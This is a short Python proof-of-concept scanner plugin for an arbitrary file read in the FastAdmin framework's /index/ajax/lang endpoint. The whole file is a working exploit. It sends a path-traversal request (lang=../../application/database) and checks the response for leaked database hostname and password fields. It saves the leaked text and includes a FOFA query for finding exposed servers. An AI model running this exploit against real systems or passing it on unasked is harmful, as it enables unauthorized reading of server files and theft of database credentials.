#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/3eBtYB_XlFKvna08ZqT4oQ',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'fastAdmin开发框架lang接口存在任意文件读取',

      'level'     :   'medium',

      'FOFA'      :   'body="fastadmin.net" || body="<h1>fastadmin</h1>" && title="fastadmin"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/6/18',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept': '*/*',
      'Connection': 'Keep-Alive',
      }
  target = '/index/ajax/lang?lang=../../application/database'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'jsonpReturn.*?hostname.*?database.*?password.*?sql_explain',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret